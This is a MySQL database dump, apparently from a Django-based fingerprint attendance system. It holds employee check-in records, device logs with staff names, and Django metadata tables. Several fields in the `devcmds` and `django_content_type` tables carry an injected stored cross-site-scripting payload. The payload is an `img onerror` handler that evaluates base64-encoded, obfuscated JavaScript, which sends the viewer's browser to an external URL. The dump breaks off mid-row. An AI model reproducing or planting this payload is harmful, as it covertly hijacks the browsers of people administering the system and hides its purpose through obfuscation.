INSERT INTO `checkinout` VALUES (1,5,'2022-11-29 17:05:10','O',1,'A3AG223160114','1','0','0'),(2,5,'2022-11-29 17:03:10','O',1,'A3AG223160114','1','0','0'),(3,2,'2022-11-29 17:04:10','O',1,'A3AG223160114','1','0','0'),(4,2,'2022-11-29 17:06:10','O',1,'A3AG223160114','1','0','0'),(5,5,'2022-11-29 17:15:10','O',1,'A3AG223160114','1','0','0'),(6,5,'2022-11-29 17:25:10','O',1,'A3AG223160114','1','0','0'),(7,5,'2022-11-29 17:16:11','O',1,'A3AG223160114','1','0','0'),(8,5,'2022-11-29 17:18:12','O',1,'A3AG223160114','1','0','0'),(9,5,'2022-11-29 16:49:10','O',1,'A3AG223160114','1','0','0'),(10,5,'2022-11-29 16:48:10','O',1,'A3AG223160114','1','0','0'),(11,5,'2022-11-29 16:45:10','O',1,'A3AG223160114','1','0','0'),(12,5,'2022-11-30 08:05:10','I',1,'A3AG223160114','1','0','0'),(13,5,'2022-11-30 08:03:10','I',1,'A3AG223160114','1','0','0'),(14,5,'2022-11-30 08:04:10','I',1,'A3AG223160114','1','0','0'),(15,2,'2022-11-30 08:06:10','I',1,'A3AG223160114','1','0','0'),(16,5,'2022-11-30 08:15:10','I',1,'A3AG223160114','1','0','0'),(17,2,'2022-11-30 08:25:10','I',1,'A3AG223160114','1','0','0'),(18,2,'2022-11-30 08:16:11','I',1,'A3AG223160114','1','0','0'),(19,2,'2022-11-30 08:18:12','I',1,'A3AG223160114','1','0','0'),(20,5,'2022-11-30 07:49:10','I',3,'A3AG223160114','1','0','0'),(21,2,'2022-11-30 07:48:10','I',1,'A3AG223160114','1','0','0'),(22,5,'2022-11-30 07:45:10','I',1,'A3AG223160114','1','0','0'),(23,6,'2022-11-30 07:49:10','I',1,'A3AG223160114','1','0','0'),(24,5,'2022-11-30 07:48:10','I',1,'A3AG223160114','1','0','0'),(25,5,'2022-11-30 07:45:12','I',1,'A3AG223160114','1','0','0'),(26,6,'2022-11-30 17:05:10','O',1,'A3AG223160114','1','0','0'),(27,5,'2022-11-30 16:03:18','O',1,'A3AG223160114','1','0','0'),(28,5,'2022-11-30 13:11:03','I',1,'A3AG223160114','1','0','0'),(29,5,'2022-11-30 13:12:01','I',1,'A3AG223160114','1','0','0'),(30,7,'2022-11-30 13:52:48','I',1,'A3AG223160114','1','0','0'),(31,3,'2022-11-30 17:33:45','O',1,'A3AG223160114','1','0','0'),(32,5,'2022-12-01 00:22:20','I',1,'A3AG223160114','1','0','0'),(33,8,'2022-12-01 00:28:27','I',1,'A3AG223160114','1','0','0'),(34,8,'2022-12-01 00:29:21','I',1,'A3AG223160114','1','0','0'),(35,8,'2022-12-01 00:29:51','I',1,'A3AG223160114','1','0','0'),(36,8,'2022-12-01 00:31:42','I',1,'A3AG223160114','1','0','0'),(37,8,'2022-12-01 00:31:53','O',1,'A3AG223160114','1','0','0'),(38,8,'2022-12-01 00:32:02','4',1,'A3AG223160114','1','0','0'),(39,8,'2022-12-01 00:32:11','5',1,'A3AG223160114','1','0','0'),(40,5,'2022-12-01 03:47:53','I',1,'A3AG223160114','1','0','0'),(41,5,'2022-12-01 03:50:00','O',1,'A3AG223160114','1','0','0'),(42,5,'2022-12-01 03:50:21','4',1,'A3AG223160114','1','0','0'),(43,5,'2022-12-01 03:50:26','5',1,'A3AG223160114','1','0','0'),(44,5,'2022-12-01 09:45:56','I',1,'A3AG223160114','1','0','0'),(45,2,'2022-12-01 08:13:30','I',1,'A3AG223160114','1','0','0'),(46,6,'2022-12-01 10:16:08','I',1,'A3AG223160114','1','0','0'),(47,5,'2022-12-01 10:24:28','O',1,'A3AG223160114','1','0','0'),(48,5,'2022-12-01 12:01:43','5',1,'A3AG223160114','1','0','0'),(49,6,'2022-12-01 12:03:30','5',1,'A3AG223160114','1','0','0'),(50,5,'2022-12-01 12:04:05','4',1,'A3AG223160114','1','0','0'),(51,5,'2022-12-01 14:23:35','4',1,'A3AG223160114','1','0','0'),(52,9,'2022-12-01 14:29:28','I',1,'A3AG223160114','1','0','0'),(53,5,'2022-12-01 14:29:45','I',1,'A3AG223160114','1','0','0'),(54,5,'2022-12-01 14:30:05','O',1,'A3AG223160114','1','0','0'),(55,5,'2022-12-01 15:48:18','5',1,'A3AG223160114','1','0','0'),(56,5,'2022-12-01 17:47:51','O',1,'A3AG223160114','1','0','0'),(57,5,'2022-12-02 09:15:38','I',1,'A3AG223160114','1','0','0'),(58,5,'2022-12-02 09:52:58','I',1,'A3AG223160114','1','0','0'),(59,6,'2022-12-02 10:10:45','I',1,'A3AG223160114','1','0','0'),(60,6,'2022-12-02 10:18:15','I',1,'A3AG223160114','1','0','0'),(61,5,'2022-12-02 13:34:00','I',1,'A3AG223160114','1','0','0'),(62,5,'2022-12-02 13:34:21','I',1,'A3AG223160114','1','0','0'),(63,5,'2022-12-02 13:35:18','O',1,'A3AG223160114','1','0','0');
/*!40000 ALTER TABLE `checkinout` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `departments`
--

DROP TABLE IF EXISTS `departments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `departments` (
  `DeptID` int(11) NOT NULL,
  `DeptName` varchar(20) NOT NULL,
  `supdeptid` int(11) NOT NULL,
  PRIMARY KEY (`DeptID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `departments`
--

LOCK TABLES `departments` WRITE;
/*!40000 ALTER TABLE `departments` DISABLE KEYS */;
INSERT INTO `departments` VALUES (1,'Our Company',0);
/*!40000 ALTER TABLE `departments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `devcmds`
--

DROP TABLE IF EXISTS `devcmds`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `devcmds` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `SN_id` varchar(20) NOT NULL,
  `CmdContent` varchar(900) DEFAULT NULL,
  `CmdCommitTime` datetime NOT NULL,
  `CmdTransTime` datetime DEFAULT NULL,
  `CmdOverTime` datetime DEFAULT NULL,
  `CmdReturn` int(11) DEFAULT NULL,
  `User_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `devcmds_SN_id` (`SN_id`),
  KEY `devcmds_User_id` (`User_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `devcmds`
--

LOCK TABLES `devcmds` WRITE;
/*!40000 ALTER TABLE `devcmds` DISABLE KEYS */;
INSERT INTO `devcmds` VALUES (1,'10000001','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','2011-09-05 15:14:19',NULL,NULL,NULL,NULL),(2,'A3AG223160114','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','2022-11-30 00:15:20','2022-11-30 00:15:24','2022-11-30 00:15:28',0,NULL),(3,'A3AG223160114','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','2022-11-30 00:15:20','2022-11-30 00:15:24','2022-11-30 00:15:59',0,NULL),(4,'A3AG223160114','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','2022-11-30 00:21:49','2022-11-30 00:22:19','2022-11-30 00:22:21',0,NULL);
/*!40000 ALTER TABLE `devcmds` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `devlog`
--

DROP TABLE IF EXISTS `devlog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `devlog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `SN_id` varchar(20) NOT NULL,
  `OP` varchar(8) NOT NULL,
  `Object` varchar(20) DEFAULT NULL,
  `Cnt` int(11) NOT NULL,
  `ECnt` int(11) NOT NULL,
  `OpTime` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `devlog_SN_id` (`SN_id`)
) ENGINE=MyISAM AUTO_INCREMENT=103 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `devlog`
--

LOCK TABLES `devlog` WRITE;
/*!40000 ALTER TABLE `devlog` DISABLE KEYS */;
INSERT INTO `devlog` VALUES (1,'A3AG223160114','USERDATA','000000004 Ramdani',1,0,'2022-11-30 00:18:44'),(2,'A3AG223160114','USERDATA','000000004 Ramdani',4,0,'2022-11-30 00:18:44'),(3,'A3AG223160114','USERDATA','000000004 Ramdani',4,0,'2022-11-30 00:18:44'),(4,'A3AG223160114','TRANSACT','3	2022-11-29 22:29:1',10,0,'2022-11-30 00:18:44'),(5,'A3AG223160114','USERDATA','None',128,0,'2022-11-30 00:18:45'),(6,'A3AG223160114','USERDATA','None',9,0,'2022-11-30 00:18:45'),(7,'A3AG223160114','USERDATA','000000004 Ramdani',4,0,'2022-11-30 00:22:25'),(8,'A3AG223160114','USERDATA','000000004 Ramdani',4,0,'2022-11-30 00:22:25'),(9,'A3AG223160114','TRANSACT','3	2022-11-30 01:34:2',1,0,'2022-11-30 01:34:35'),(10,'A3AG223160114','USERDATA','None',3,0,'2022-11-30 09:52:04'),(11,'A3AG223160114','TRANSACT','3	2022-11-30 09:53:5',1,0,'2022-11-30 09:54:04'),(12,'A3AG223160114','TRANSACT','3	2022-11-30 10:26:2',1,0,'2022-11-30 10:26:32'),(13,'A3AG223160114','USERDATA','None',1,0,'2022-11-30 10:27:32'),(14,'A3AG223160114','TRANSACT','3	2022-11-30 10:28:0',1,0,'2022-11-30 10:28:02'),(15,'A3AG223160114','TRANSACT','4	2022-11-30 10:30:4',1,0,'2022-11-30 10:30:52'),(16,'A3AG223160114','TRANSACT','3	2022-11-30 10:32:5',1,0,'2022-11-30 10:33:05'),(17,'A3AG223160114','TRANSACT','4	2022-11-30 10:35:0',1,0,'2022-11-30 10:35:15'),(18,'A3AG223160114','TRANSACT','4	2022-11-30 10:36:5',1,0,'2022-11-30 10:37:05'),(19,'A3AG223160114','TRANSACT','4	2022-11-30 10:37:2',1,0,'2022-11-30 10:37:25'),(20,'A3AG223160114','USERDATA','None',1,0,'2022-11-30 10:37:45'),(21,'A3AG223160114','USERDATA','None',1,0,'2022-11-30 10:39:35'),(22,'A3AG223160114','USERDATA','000000003 Wahid',1,0,'2022-11-30 10:42:57'),(23,'A3AG223160114','USERDATA','None',1,0,'2022-11-30 10:42:57'),(24,'A3AG223160114','TRANSACT','3	2022-11-30 10:43:1',1,0,'2022-11-30 10:43:17'),(25,'A3AG223160114','TRANSACT','4	2022-11-30 10:43:4',1,0,'2022-11-30 10:43:48'),(26,'A3AG223160114','TRANSACT','3	2022-11-30 10:44:4',1,0,'2022-11-30 10:44:58'),(27,'A3AG223160114','USERDATA','000000004 Ramdani',4,0,'2022-11-30 10:45:38'),(28,'A3AG223160114','USERDATA','000000004 Ramdani',4,0,'2022-11-30 10:45:38'),(29,'A3AG223160114','TRANSACT','',0,0,'2022-11-30 10:45:38'),(30,'A3AG223160114','USERDATA','None',128,0,'2022-11-30 10:45:38'),(31,'A3AG223160114','USERDATA','None',16,0,'2022-11-30 10:45:38'),(32,'A3AG223160114','TRANSACT','',0,0,'2022-11-30 10:46:08'),(33,'A3AG223160114','USERDATA','None',1,0,'2022-11-30 10:47:18'),(34,'A3AG223160114','USERDATA','None',1,0,'2022-11-30 10:47:38'),(35,'A3AG223160114','USERDATA','000000005 Uci',1,0,'2022-11-30 10:48:18'),(36,'A3AG223160114','USERDATA','None',2,0,'2022-11-30 10:48:18'),(37,'A3AG223160114','USERDATA','000000005 Uci',1,0,'2022-11-30 10:48:18'),(38,'A3AG223160114','TRANSACT','5	2022-11-30 10:48:1',1,0,'2022-11-30 10:48:28'),(39,'A3AG223160114','TRANSACT','3	2022-11-30 10:49:4',1,0,'2022-11-30 10:49:48'),(40,'A3AG223160114','TRANSACT','3	2022-11-30 10:51:1',1,0,'2022-11-30 10:51:18'),(41,'A3AG223160114','TRANSACT','5	2022-11-30 10:54:0',1,0,'2022-11-30 10:54:10'),(42,'A3AG223160114','TRANSACT','3	2022-11-30 10:58:0',1,0,'2022-11-30 10:58:10'),(43,'A3AG223160114','USERDATA','None',2,0,'2022-11-30 11:01:33'),(44,'A3AG223160114','TRANSACT','3	2022-11-30 13:11:0',1,0,'2022-11-30 13:11:14'),(45,'A3AG223160114','USERDATA','None',3,0,'2022-11-30 13:11:24'),(46,'A3AG223160114','TRANSACT','3	2022-11-30 13:12:0',1,0,'2022-11-30 13:12:07'),(47,'A3AG223160114','USERDATA','None',4,0,'2022-11-30 13:30:40'),(48,'A3AG223160114','USERDATA','None',1,0,'2022-11-30 13:50:57'),(49,'A3AG223160114','USERDATA','None',1,0,'2022-11-30 13:52:07'),(50,'A3AG223160114','USERDATA','000000006 Bimo',1,0,'2022-11-30 13:52:40'),(51,'A3AG223160114','USERDATA','000000006 Bimo',1,0,'2022-11-30 13:52:40'),(52,'A3AG223160114','USERDATA','None',2,0,'2022-11-30 13:52:50'),(53,'A3AG223160114','USERDATA','000000006 Bimo',1,0,'2022-11-30 13:52:50'),(54,'A3AG223160114','TRANSACT','6	2022-11-30 13:52:4',1,0,'2022-11-30 13:52:50'),(55,'A3AG223160114','USERDATA','None',1,0,'2022-12-01 00:22:51'),(56,'A3AG223160114','TRANSACT','1	2022-11-30 17:33:4',2,0,'2022-12-01 00:23:21'),(57,'A3AG223160114','USERDATA','None',5,0,'2022-12-01 00:23:21'),(58,'A3AG223160114','USERDATA','None',1,0,'2022-12-01 00:26:54'),(59,'A3AG223160114','USERDATA','000000007 Jaydawn',1,0,'2022-12-01 00:27:24'),(60,'A3AG223160114','USERDATA','None',1,0,'2022-12-01 00:27:24'),(61,'A3AG223160114','USERDATA','000000007 Jaydawn',1,0,'2022-12-01 00:27:24'),(62,'A3AG223160114','USERDATA','None',1,0,'2022-12-01 00:27:34'),(63,'A3AG223160114','TRANSACT','7	2022-12-01 00:28:2',1,0,'2022-12-01 00:28:34'),(64,'A3AG223160114','TRANSACT','7	2022-12-01 00:29:2',1,0,'2022-12-01 00:29:24'),(65,'A3AG223160114','TRANSACT','7	2022-12-01 00:29:5',1,0,'2022-12-01 00:29:54'),(66,'A3AG223160114','USERDATA','None',1,0,'2022-12-01 00:31:14'),(67,'A3AG223160114','TRANSACT','7	2022-12-01 00:31:4',1,0,'2022-12-01 00:31:54'),(68,'A3AG223160114','TRANSACT','7	2022-12-01 00:31:5',1,0,'2022-12-01 00:32:04'),(69,'A3AG223160114','TRANSACT','7	2022-12-01 00:32:0',1,0,'2022-12-01 00:32:04'),(70,'A3AG223160114','TRANSACT','7	2022-12-01 00:32:1',1,0,'2022-12-01 00:32:14'),(71,'A3AG223160114','TRANSACT','3	2022-12-01 03:47:5',1,0,'2022-12-01 03:49:51'),(72,'A3AG223160114','USERDATA','None',4,0,'2022-12-01 03:49:51'),(73,'A3AG223160114','TRANSACT','3	2022-12-01 03:50:0',1,0,'2022-12-01 03:50:11'),(74,'A3AG223160114','TRANSACT','3	2022-12-01 03:50:2',1,0,'2022-12-01 03:50:31'),(75,'A3AG223160114','TRANSACT','3	2022-12-01 03:50:2',1,0,'2022-12-01 03:50:31'),(76,'A3AG223160114','USERDATA','None',2,0,'2022-12-01 09:44:06'),(77,'A3AG223160114','TRANSACT','3	2022-12-01 09:45:5',1,0,'2022-12-01 09:46:06'),(78,'A3AG223160114','TRANSACT','4	2022-12-01 09:47:3',1,0,'2022-12-01 09:47:36'),(79,'A3AG223160114','TRANSACT','5	2022-12-01 10:16:0',1,0,'2022-12-01 10:16:13'),(80,'A3AG223160114','TRANSACT','3	2022-12-01 10:24:2',1,0,'2022-12-01 10:24:35'),(81,'A3AG223160114','TRANSACT','3	2022-12-01 12:01:4',1,0,'2022-12-01 12:01:49'),(82,'A3AG223160114','TRANSACT','5	2022-12-01 12:03:3',1,0,'2022-12-01 12:03:39'),(83,'A3AG223160114','TRANSACT','3	2022-12-01 12:04:0',1,0,'2022-12-01 12:04:09'),(84,'A3AG223160114','USERDATA','None',1,0,'2022-12-01 13:37:10'),(85,'A3AG223160114','TRANSACT','3	2022-12-01 14:23:3',1,0,'2022-12-01 14:23:42'),(86,'A3AG223160114','USERDATA','None',1,0,'2022-12-01 14:28:42'),(87,'A3AG223160114','USERDATA','None',1,0,'2022-12-01 14:28:54'),(88,'A3AG223160114','USERDATA','000000008 Eka',1,0,'2022-12-01 14:29:24'),(89,'A3AG223160114','USERDATA','None',2,0,'2022-12-01 14:29:24'),(90,'A3AG223160114','USERDATA','000000008 Eka',1,0,'2022-12-01 14:29:24'),(91,'A3AG223160114','TRANSACT','8	2022-12-01 14:29:2',1,0,'2022-12-01 14:29:34'),(92,'A3AG223160114','TRANSACT','3	2022-12-01 14:29:4',1,0,'2022-12-01 14:29:54'),(93,'A3AG223160114','TRANSACT','3	2022-12-01 14:30:0',1,0,'2022-12-01 14:30:14'),(94,'A3AG223160114','TRANSACT','3	2022-12-01 15:48:1',1,0,'2022-12-01 15:48:30'),(95,'A3AG223160114','TRANSACT','3	2022-12-01 17:47:5',1,0,'2022-12-01 17:47:59'),(96,'A3AG223160114','TRANSACT','3	2022-12-02 09:15:3',1,0,'2022-12-02 09:15:46'),(97,'A3AG223160114','TRANSACT','3	2022-12-02 09:52:5',1,0,'2022-12-02 09:53:03'),(98,'A3AG223160114','TRANSACT','5	2022-12-02 10:10:4',1,0,'2022-12-02 10:10:49'),(99,'A3AG223160114','TRANSACT','5	2022-12-02 10:18:1',1,0,'2022-12-02 10:18:21'),(100,'A3AG223160114','TRANSACT','3	2022-12-02 13:34:0',1,0,'2022-12-02 13:34:01'),(101,'A3AG223160114','TRANSACT','3	2022-12-02 13:34:2',1,0,'2022-12-02 13:34:31'),(102,'A3AG223160114','TRANSACT','3	2022-12-02 13:35:1',1,0,'2022-12-02 13:35:23');
/*!40000 ALTER TABLE `devlog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_admin_log`
--

DROP TABLE IF EXISTS `django_admin_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_admin_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `action_time` datetime NOT NULL,
  `user_id` int(11) NOT NULL,
  `content_type_id` int(11) DEFAULT NULL,
  `object_id` longtext DEFAULT NULL,
  `object_repr` varchar(900) DEFAULT NULL,
  `action_flag` smallint(5) unsigned NOT NULL,
  `change_message` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `django_admin_log_user_id` (`user_id`),
  KEY `django_admin_log_content_type_id` (`content_type_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_admin_log`
--

LOCK TABLES `django_admin_log` WRITE;
/*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_admin_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_content_type`
--

DROP TABLE IF EXISTS `django_content_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_content_type` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(900) DEFAULT NULL,
  `app_label` varchar(900) DEFAULT NULL,
  `model` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=45 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_content_type`
--

LOCK TABLES `django_content_type` WRITE;
/*!40000 ALTER TABLE `django_content_type` DISABLE KEYS */;
INSERT INTO `django_content_type` VALUES (1,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(2,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" 